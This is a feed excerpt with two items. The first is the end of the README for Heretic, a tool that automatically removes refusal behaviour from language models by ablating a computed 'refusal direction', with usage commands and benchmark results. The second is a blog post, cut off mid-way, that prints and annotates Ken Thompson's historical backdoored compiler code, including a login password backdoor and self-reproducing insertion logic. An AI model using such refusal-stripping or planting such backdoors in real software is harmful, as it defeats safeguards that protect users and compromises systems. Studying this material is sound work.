<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/2702526/514848515-d71a5efa-d6be-4705-a817-63332afb2d15.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODUxNS1kNzFhNWVmYS1kNmJlLTQ3MDUtYTgxNy02MzMzMmFmYjJkMTUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YTZhN2NmYWQxOTUyM2M0YWE1YjZiYzliMTU3MDRiNzY1MTYxOTA2MzU3ZTMyNGJlNmEwMWM3ODk4NTUxNTJlZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.1I1JFXslaOPaXZ-yLNJ8O7xiIOpfkfBOgSIVOZanGYo"><img width="650" height="715" alt="Screenshot" src="https://private-user-images.githubusercontent.com/2702526/514848515-d71a5efa-d6be-4705-a817-63332afb2d15.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODUxNS1kNzFhNWVmYS1kNmJlLTQ3MDUtYTgxNy02MzMzMmFmYjJkMTUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YTZhN2NmYWQxOTUyM2M0YWE1YjZiYzliMTU3MDRiNzY1MTYxOTA2MzU3ZTMyNGJlNmEwMWM3ODk4NTUxNTJlZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.1I1JFXslaOPaXZ-yLNJ8O7xiIOpfkfBOgSIVOZanGYo"></a>

<p dir="auto">Running unsupervised with the default configuration, Heretic can produce
decensored models that rival the quality of abliterations created manually
by human experts:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Model</th>
<th>Refusals for "harmful" prompts</th>
<th>KL divergence from original model for "harmless" prompts</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://huggingface.co/google/gemma-3-12b-it" rel="nofollow">google/gemma-3-12b-it</a> (original)</td>
<td>97/100</td>
<td>0 <em>(by definition)</em></td>
</tr>
<tr>
<td><a href="https://huggingface.co/mlabonne/gemma-3-12b-it-abliterated-v2" rel="nofollow">mlabonne/gemma-3-12b-it-abliterated-v2</a></td>
<td>3/100</td>
<td>1.04</td>
</tr>
<tr>
<td><a href="https://huggingface.co/huihui-ai/gemma-3-12b-it-abliterated" rel="nofollow">huihui-ai/gemma-3-12b-it-abliterated</a></td>
<td>3/100</td>
<td>0.45</td>
</tr>
<tr>
<td><strong><a href="https://huggingface.co/p-e-w/gemma-3-12b-it-heretic" rel="nofollow">p-e-w/gemma-3-12b-it-heretic</a> (ours)</strong></td>
<td><strong>3/100</strong></td>
<td><strong>0.16</strong></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">The Heretic version, generated without any human effort, achieves the same
level of refusal suppression as other abliterations, but at a much lower
KL divergence, indicating less damage to the original model's capabilities.
<em>(You can reproduce those numbers using Heretic's built-in evaluation functionality,
e.g. <code>heretic --model google/gemma-3-12b-it --evaluate-model p-e-w/gemma-3-12b-it-heretic</code>.
Note that the exact values might be platform- and hardware-dependent.
The table above was compiled using PyTorch 2.8 on an RTX 5090.)</em></p>
<p dir="auto">Heretic supports most dense models, including many multimodal models, and
several different MoE architectures. It does not yet support SSMs/hybrid models,
models with inhomogeneous layers, and certain novel attention systems.</p>
<p dir="auto">You can find a collection of models that have been decensored using Heretic
<a href="https://huggingface.co/collections/p-e-w/the-bestiary" rel="nofollow">on Hugging Face</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto">Prepare a Python 3.10+ environment with PyTorch 2.2+ installed as appropriate
for your hardware. Then run:</p>
<div data-snippet-clipboard-copy-content="pip install heretic-llm
heretic Qwen/Qwen3-4B-Instruct-2507"><pre><code>pip install heretic-llm
heretic Qwen/Qwen3-4B-Instruct-2507
</code></pre></div>
<p dir="auto">Replace <code>Qwen/Qwen3-4B-Instruct-2507</code> with whatever model you want to decensor.</p>
<p dir="auto">The process is fully automatic and does not require configuration; however,
Heretic has a variety of configuration parameters that can be changed for
greater control. Run <code>heretic --help</code> to see available command-line options,
or look at <a href="https://github.com/p-e-w/heretic/blob/master/config.default.toml"><code>config.default.toml</code></a> if you prefer to use
a configuration file.</p>
<p dir="auto">At the start of a program run, Heretic benchmarks the system to determine
the optimal batch size to make the most of the available hardware.
On an RTX 3090, with the default configuration, decensoring Llama-3.1-8B
takes about 45 minutes.</p>
<p dir="auto">After Heretic has finished decensoring a model, you are given the option to
save the model, upload it to Hugging Face, chat with it to test how well it works,
or any combination of those actions.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How it works</h2><a id="user-content-how-it-works" aria-label="Permalink: How it works" href="#how-it-works"></a></p>
<p dir="auto">Heretic implements a parametrized variant of directional ablation. For each
supported transformer component (currently, attention out-projection and
MLP down-projection), it identifies the associated matrices in each transformer
layer, and orthogonalizes them with respect to the relevant "refusal direction",
inhibiting the expression of that direction in the result of multiplications
with that matrix.</p>
<p dir="auto">Refusal directions are computed for each layer as a difference-of-means between
the first-token residuals for "harmful" and "harmless" example prompts.</p>
<p dir="auto">The ablation process is controlled by several optimizable parameters:</p>
<ul dir="auto">
<li><code>direction_index</code>: Either the index of a refusal direction, or the special
value <code>per layer</code>, indicating that each layer should be ablated using the
refusal direction associated with that layer.</li>
<li><code>max_weight</code>, <code>max_weight_position</code>, <code>min_weight</code>, and <code>min_weight_distance</code>:
For each component, these parameters describe the shape and position of the
ablation weight kernel over the layers. The following diagram illustrates this:</li>
</ul>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/2702526/514848549-82e4b84e-5a82-4faf-b918-ac642f9e4892.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODU0OS04MmU0Yjg0ZS01YTgyLTRmYWYtYjkxOC1hYzY0MmY5ZTQ4OTIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YWY4ZDllOWEyYWVhMTFhNmFhNDhmNDlkMzEzNWMyMjJhNzI1OTA2NzI2Zjc2Yjk1MDdjODQxYTY5YTMwOWFhMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tuFZeo2gd9r6uO3IF9L0UZ8oZ6mtlhAk7G_9qDXoEwQ"><img width="800" height="500" alt="Explanation" src="https://private-user-images.githubusercontent.com/2702526/514848549-82e4b84e-5a82-4faf-b918-ac642f9e4892.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjMzMTQ1MDEsIm5iZiI6MTc2MzMxNDIwMSwicGF0aCI6Ii8yNzAyNTI2LzUxNDg0ODU0OS04MmU0Yjg0ZS01YTgyLTRmYWYtYjkxOC1hYzY0MmY5ZTQ4OTIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MTExNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTExMTZUMTczMDAxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YWY4ZDllOWEyYWVhMTFhNmFhNDhmNDlkMzEzNWMyMjJhNzI1OTA2NzI2Zjc2Yjk1MDdjODQxYTY5YTMwOWFhMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tuFZeo2gd9r6uO3IF9L0UZ8oZ6mtlhAk7G_9qDXoEwQ"></a>

<p dir="auto">Heretic's main innovations over existing abliteration systems are:</p>
<ul dir="auto">
<li>The shape of the ablation weight kernel is highly flexible, which, combined with
automatic parameter optimization, can improve the compliance/quality tradeoff.
Non-constant ablation weights were previously explored by Maxime Labonne in
<a href="https://huggingface.co/mlabonne/gemma-3-12b-it-abliterated-v2" rel="nofollow">gemma-3-12b-it-abliterated-v2</a>.</li>
<li>The refusal direction index is a float rather than an integer. For non-integral
values, the two nearest refusal direction vectors are linearly interpolated.
This unlocks a vast space of additional directions beyond the ones identified
by the difference-of-means computation, and often enables the optimization
process to find a better direction than that belonging to any individual layer.</li>
<li>Ablation parameters are chosen separately for each component. I have found that
MLP interventions tend to be more damaging to the model than attention interventions,
so using different ablation weights can squeeze out some extra performance.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Prior art</h2><a id="user-content-prior-art" aria-label="Permalink: Prior art" href="#prior-art"></a></p>
<p dir="auto">I'm aware of the following publicly available implementations of abliteration
techniques:</p>
<ul dir="auto">
<li><a href="https://huggingface.co/posts/mlabonne/714992455492422" rel="nofollow">AutoAbliteration</a></li>
<li><a href="https://github.com/FailSpy/abliterator">abliterator.py</a></li>
<li><a href="https://github.com/wassname/abliterator">wassname's Abliterator</a></li>
<li><a href="https://github.com/Tsadoq/ErisForge">ErisForge</a></li>
<li><a href="https://github.com/Sumandora/remove-refusals-with-transformers">Removing refusals with HF Transformers</a></li>
<li><a href="https://github.com/AUGMXNT/deccp">deccp</a></li>
</ul>
<p dir="auto">Note that Heretic was written from scratch, and does not reuse code from
any of those projects.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgments</h2><a id="user-content-acknowledgments" aria-label="Permalink: Acknowledgments" href="#acknowledgments"></a></p>
<p dir="auto">The development of Heretic was informed by:</p>
<ul dir="auto">
<li><a href="https://arxiv.org/abs/2406.11717" rel="nofollow">The original abliteration paper (Arditi et al. 2024)</a></li>
<li><a href="https://huggingface.co/blog/mlabonne/abliteration" rel="nofollow">Maxime Labonne's article on abliteration</a>,
as well as some details from the model cards of his own abliterated models (see above)</li>
<li><a href="https://huggingface.co/blog/grimjim/projected-abliteration" rel="nofollow">Jim Lai's article describing "projected abliteration"</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Copyright ¬© 2025  Philipp Emanuel Weidmann (<a href="mailto:pew@worldwidemann.com">pew@worldwidemann.com</a>)</p>
<p dir="auto">This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.</p>
<p dir="auto">This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.</p>
<p dir="auto">You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <a href="https://www.gnu.org/licenses/" rel="nofollow">https://www.gnu.org/licenses/</a>.</p>
<p dir="auto"><strong>By contributing to this project, you agree to release your
contributions under the same license.</strong></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running the "Reflections on Trusting Trust" Compiler (2023) (109 pts)]]></title>
            <link>https://research.swtch.com/nih</link>
            <guid>45945202</guid>
            <pubDate>Sun, 16 Nov 2025 13:59:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a>, See on <a href="https://news.ycombinator.com/item?id=45945202">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>Running the ‚ÄúReflections on Trusting Trust‚Äù Compiler

        <div>
        <p>

            Posted on Wednesday, October 25, 2023.


        </p>
        </div>
        </h2>
       


<p>
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn‚Äôt used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the ‚ÄúAnnual Conference on Computers.‚Äù)
Ken‚Äôs lecture was later published in <i>Communications of the ACM</i>
under the title ‚Äú<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.‚Äù
It is a classic paper, and a short one (3 pages);
if you haven‚Äôt read it yet, you should. This post will still be here when you get back.
</p>

<p>
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the ‚Äúlogin‚Äù program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken‚Äôs actual code.
But first, a brief summary of the important parts of the lecture.
</p>

<a href="#step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>

<p>
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a ‚Äú<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>,‚Äù
popularized by Douglas Hofstadter in <i>G√∂del, Escher, Bach</i>.
Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
</p>

<pre>s=<span>‚Äôs=%r;print(s%%s)‚Äô</span>;print(s%s)
</pre>

<p>
And here is a slightly less cryptic Go quine:
</p>

<pre>package main
func main() { print(q + "\x60" + q + "\x60") }
var q = <span>`package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `</span>
</pre>

<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is <code>%r</code>;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post ‚Äú<a href="https://research.swtch.com/zip">Zip Files All The Way Down</a>,‚Äù which uses a Lempel-Ziv quine to construct a zip file that contains itself.
</p>

<a href="#step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>

<p>
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
</p>

<pre>c = next();
if(c == '\\') {
    c = next();
    if(c == 'n')
        c = '\n';
}
</pre>

<p>
That code is responsible for processing the two character sequence <code>\n</code>
in a string literal
and turning it into a corresponding byte value,
specifically <code>‚Äô\n‚Äô</code>.
But that‚Äôs a circular definition, and the first time you write code like that it won‚Äôt compile.
So instead you write <code>c = 10</code>,
you compile and install the compiler, and <i>then</i> you can change
the code to <code>c = ‚Äô\n‚Äô</code>.
The compiler has ‚Äúlearned‚Äù the value of <code>‚Äô\n‚Äô</code>,
but that value only appears in the compiler binary,
not in the source code.
</p>

<a href="#step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>

<p>
Step 3 is to put these together to help the compiler ‚Äúlearn‚Äù
to miscompile the target program (<code>login</code> in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
</p>

<ol>
<li>Recognize <code>login</code> and insert the backdoor.
</li><li>Recognize the compiler itself and insert the code for these two changes.
</li></ol>

<p>
The ‚Äúinsert the code for these two changes‚Äù step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has ‚Äúlearned‚Äù the miscompilation steps,
and the clean source code can be restored.
</p>

<a href="#run"><h2 id="run">Running the Code</h2></a>

<p>At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
about his 75-year effort accumulating what must be the world‚Äôs
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
‚Äúcan you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?‚Äù
Ken replied:
</p>

<blockquote>
I assume you‚Äôre talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn‚Äôt.
But they broke it, because of some technical effect,
but they didn‚Äôt find out what it was and then track it.
So it never got out, if that‚Äôs what you‚Äôre talking about.
I hate to say this in front of a big audience, but
the one question I‚Äôve been waiting for since I wrote that paper is
‚Äúyou got the code?‚Äù
Never been asked.
I still have the code.
</blockquote>

<p>Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called <code>nih.a</code>,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for ‚Äúnot invented here.‚Äù)
Normally today, <code>.a</code> files are archives containing
compiler object files,
but this one contains two source files.</p>

<p>
The code applies cleanly to the C compiler from the
<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
I‚Äôve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including <code>nih.a</code>.
Let‚Äôs actually run the code.
You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>


<table>
<tbody><tr>
<td>
<p>Login as <code>ken</code>, password <code>ken</code>.<br>
(The password is normally not shown.)
</p></td><td><pre>login: <b>ken</b>
Password: <b>ken</b>

% <b>who</b>
ken     tty8 Aug 14 22:06
%
</pre>
</td></tr><tr>
<td>
<p>Change to and list the <code>nih</code> directory,<br>
discovering a Unix archive.
</p></td><td><pre>% <b>chdir nih</b>
% <b>ls</b>
nih.a
</pre>
</td></tr><tr>
<td>
<p>Extract <code>nih.a</code>.
</p></td><td><pre>% <b>ar xv nih.a</b>
x x.c
x rc
</pre>
</td></tr><tr>
<td>
<p>Let‚Äôs read <code>x.c</code>, a C program.
</p></td><td><pre>% <b>cat x.c</b>
</pre>
</td></tr><tr>
<td>
<p>Declare the global variable <code>nihflg</code>,<br>
of implied type <code>int</code>.
</p></td><td><pre>nihflg;
</pre>
</td></tr><tr>
<td>
<p>
Define the function <code>codenih</code>, with implied<br>
return type <code>int</code> and no arguments.<br>
The compiler will be modified to call <code>codenih</code><br>
during preprocessing, for each input line.
</p></td><td><pre>codenih()
{
    char *p,*s;
    int i;
</pre>
</td></tr><tr>
<td>
<p><code>cc -p</code> prints the preprocessor output<br>
instead of invoking the compiler back end.<br>
To avoid discovery, do nothing when <code>-p</code> is used.<br>
The implied return type of <code>codenih</code> is <code>int</code>,<br>
but early C allowed omitting the return value.
</p></td><td><pre>    if(pflag)
        return;
</pre>
</td></tr><tr>
<td>
<p>Skip leading tabs in the line.
</p></td><td><pre>    p=line;
    while(*p=='\t')
        p++;
</pre>
</td></tr><tr>
<td>
<p>Look for the line<br>
‚Äú<code>name = crypt(pwbuf);</code>‚Äù from <a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a>.<br>
If not found, jump to <code>l1</code>.
</p></td><td><pre>    s="namep = crypt(pwbuf);";
    for(i=0;i&lt;21;i++)
        if(s[i]!=p[i])
            goto l1;
</pre>
</td></tr><tr>
<td>
<p>Define <code>login</code> backdoor code <code>s</code>, which does:<br>
Check for the password ‚Äú<code>codenih</code>‚Äù.<br>
If found, modify <code>namep</code> and <code>np</code><br>
so that the code that follows in <br>
<a href="https://research.swtch.com/login.c#crypt"><code>login.c</code></a> will accept the password.
</p></td><td><pre>    p=+i;
    s="for(c=0;c&lt;8;c++)"
      "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
      "while(*namep)namep++;"
      "while(*np!=':')np++;x1x:";
</pre>
</td></tr><tr>
<td>
<p>With the <code>p=+i</code> from above,<br>
this is: <code>strcpy(p+i, s); return;</code>,<br>
appending the backdoor to the line.<br>
In early C, <code>+=</code> was spelled <code>=+</code>.<br>
The loop is <code>strcpy</code>, and <code>goto l4</code><br>
jumps to the end of the function.
</p></td><td><pre>    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>No match for <code>login</code> code. Next target:<br>
the distinctive line ‚Äú<code>av[4] = "-P";</code>‚Äù<br>
from <a href="https://research.swtch.com/cc.c#av4">cc.c</a>. If not found, jump to <code>l2</code>.
</p></td><td><pre>l1:
    s="av[4] = \"-P\";";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l2;
</pre>
</td></tr><tr>
<td>
<p>Increment <code>nihflg</code> to 1 to remember<br>
evidence of being in <code>cc.c</code>, and return.
</p></td><td><pre>    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>
Next target: <a href="https://research.swtch.com/cc.c#getline">input reading loop in <code>cc.c</code></a>,<br>
but only if we‚Äôve seen the <code>av[4]</code> line too:<br>
the text ‚Äú<code>while(getline()) {</code>‚Äù<br>
is too generic and may be in other programs.<br>
If not found, jump to <code>l3</code>.
</p></td><td><pre>l2:
    if(nihflg!=1)
        goto l3;
    s="while(getline()) {";
    for(i=0;i&lt;18;i++)
        if(s[i]!=p[i])
            goto l3;
</pre>
</td></tr><tr>
<td>
<p>
Append input-reading backdoor: call <code>codenih</code><br>
(this very code!) after reading each line.<br>
Increment <code>nihflg</code> to 2 to move to next state.
</p></td><td><pre>    p=+i;
    s="codenih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
    goto l4;
</pre>
</td></tr><tr>
<td>
<p>Next target: <a href="https://research.swtch.com/cc.c#fflush">flushing output in <code>cc.c</code></a>.
</p></td><td><pre>l3:
    if(nihflg!=2)
        goto l4;
    s="fflush(obuf);";
    for(i=0;i&lt;13;i++)
        if(s[i]!=p[i])
            goto l4;
</pre>
</td></tr><tr>
<td>
<p>Insert end-of-file backdoor: call <code>repronih</code><br>
to reproduce this very source file<br>
(the definitions of <code>codenih</code> and <code>repronih</code>)<br>
at the end of the now-backdoored text of <code>cc.c</code>.
</p></td><td><pre>    p=+i;
    s="repronih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
l4:;
}
</pre>
</td></tr><tr>
<td>
<p>Here the magic begins, as presented in the<br>
Turing lecture. The <code>%0</code> is not valid C.<br>
Instead, the script <code>rc</code> will replace the <code>%</code><br>
with byte values for the text of this exact file,<br>
to be used by <code>repronih</code>.
</p></td><td><pre>char nihstr[]
{
%0
};
</pre>
</td></tr><tr>
<td>
<p>The magic continues.<br>
</p></td><td><pre>repronih()
{
    int i,n,c;
</pre>
</td></tr><tr>
<td>
<p>If <code>nihflg</code> is not 3, this is not <code>cc.c</code><br>
so don‚Äôt do anything.
</p></td><td><pre>    if(nihflg!=3)
        return;
</pre>
</td></tr><tr>
<td>
<p>The most cryptic part of the whole program.<br>
Scan over <code>nihstr</code> (indexed by <code>i</code>)<br>
in five phases according to the value <code>n</code>:
</p><p><code>n=0</code>: emit literal text before ‚Äú<code>%</code>‚Äù<br>
<code>n=1</code>: emit octal bytes of text before ‚Äú<code>%</code>‚Äù<br>
<code>n=2</code>: emit octal bytes of ‚Äú<code>%</code>‚Äù and rest of file<br>
<code>n=3</code>: no output, looking for ‚Äú<code>%</code>‚Äù<br>
<code>n=4</code>: emit literal text after ‚Äú<code>%</code>‚Äù<br>
</p>
</td><td><pre>    n=0;
    i=0;
    for(;;)
    switch(c=nihstr[i++]){
</pre>
</td></tr><tr>
<td>
<p><code>045</code> is <code>'%'</code>, kept from appearing<br>
except in the magic location inside <code>nihstr</code>.<br>
Seeing <code>%</code> increments the phase.<br>
The phase transition 0 ‚Üí 1 rewinds the input.<br>
Only phase 2 keeps processing the <code>%.</code>
</p></td><td><pre>    case 045:
        n++;
        if(n==1)
            i=0;
        if(n!=2)
            continue;
</pre>
</td></tr><tr>
<td>
<p>In phases 1 and 2, emit octal byte value<br>
(like <code>0123,</code>) to appear inside <code>nihstr</code>.<br>
Note the comma to separate array elements,<br>
so the <code>0</code> in <code>nihstr</code>‚Äôs <code>%0</code> above is a final,<br>
terminating NUL byte for the array.
</p></td><td><pre>    default:
        if(n==1||n==2){
            putc('0',obuf);
            if(c&gt;=0100)
                putc((c&gt;&gt;6)+'0',obuf);
            if(c&gt;=010)
                putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
            putc((c&amp;7)+'0',obuf);
            putc(',',obuf);
            putc('\n',obuf);
            continue;
        }
</pre>
</td></tr><tr>
<td>
<p>In phases 0 and 4, emit literal byte value,<br>
to reproduce source file around the <code>%</code>.<br>
</p></td><td><pre>        if(n!=3)
            putc(c,obuf);
        continue;
</pre>
</td></tr><tr>
<td>
<p>Reaching end of <code>nihstr</code> increments the phase<br>
and rewinds the input.<br>
The phase transition 4 ‚Üí 5 ends the function.
</p></td><td><pre>    case 0:
        n++;
        i=0;
        if(n==5){
            fflush(obuf);
            return;
        }
    }
}
</pre>
</td></tr><tr>
<td>
<p>Now let‚Äôs read <code>rc</code>, a shell script.
</p></td><td><pre>% <b>cat rc</b>
</pre>
</td></tr><tr>
<td>
<p>Start the editor <code>ed</code> on <code>x.c</code>.<br>
The V6 shell <code>sh</code> opened<br>
input scripts on standard input,<br>
sharing it with invoked commands,<br>
so the lines that follow are for <code>ed</code>.
</p></td><td><pre>ed x.c
</pre>
</td></tr><tr>
<td>
<p>Delete all tabs from every line.
</p></td><td><pre>1,$s/    //g
</pre>
</td></tr><tr>
<td>
<p>Write the modified file to <code>nih.c</code> and quit.<br>
The shell will continue reading the input script.
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Octal dump bytes of <code>nih.c</code> into <code>x</code>.<br>
The output looks like:
</p>
<p><code>% echo az | od -b<br>
0000000 141 172 012 000<br>
0000003 <br>
%<br>
</code></p>
<p>Note the trailing <code>000</code> for an odd-sized input.<br>


</p></td><td><pre>od -b nih.c &gt;x
</pre>
</td></tr><tr>
<td>
<p>Back into <code>ed</code>, this time editing <code>x</code>.
</p></td><td><pre>ed x
</pre>
</td></tr><tr>
<td>
<p>Remove the leading file offsets, adding a <code>0</code><br>
at the start of the first byte value.
</p></td><td><pre>1,$s/^....... 0*/0/
</pre>
</td></tr><tr>
<td>
<p>Replace each space before a byte value<br>
with a newline and a leading <code>0</code>.<br>
Now all the octal values are C octal constants.
</p></td><td><pre>1,$s/ 0*/\
0/g
</pre>
</td></tr><tr>
<td>
<p>Delete 0 values caused by odd-length padding<br>
or by the final offset-only line.
</p></td><td><pre>g/^0$/d
</pre>
</td></tr><tr>
<td>
<p>Add trailing commas to each line.
</p></td><td><pre>1,$s/$/,/
</pre>
</td></tr><tr>
<td>
<p>Write <code>x</code> and switch to <code>nih.c</code>.
</p></td><td><pre>w x
e nih.c
</pre>
</td></tr><tr>
<td>
<p>Move to and delete the magic <code>%0</code> line.
</p></td><td><pre>/%/d
</pre>
</td></tr><tr>
<td>
<p>Read <code>x</code> (the octal values) into the file there.
</p></td><td><pre>.-1r x
</pre>
</td></tr><tr>
<td>
<p>Add a trailing <code>0</code> to end the array.
</p></td><td><pre>.a
0
.
</pre>
</td></tr><tr>
<td>
<p>Write <code>nih.c</code> and quit. All done!
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Let‚Äôs run <code>rc</code>.<br>
The numbers are <code>ed</code> printing file sizes<br>
each time it reads or writes a file.
</p></td><td><pre>% <b>sh rc</b>
1314
1163
5249
6414
1163
6414
7576
</pre>
</td></tr><tr>
<td>
<p>Let‚Äôs check the output, <code>nih.c</code>.<br>
The tabs are gone and the octal bytes are there!
</p></td><td><pre>% <b>cat nih.c</b>
nihflg;
codenih()
{
char *p,*s;
int i;
if(pflag)
return;
<span>...</span>
char nihstr[]
{
0156,
0151,
0150,
0146,
<span>...</span>
0175,
012,
0175,
012,
0
};
repronih()
{
int i,n,c;
<span>...</span>
</pre>
</td></tr><tr>
<td>
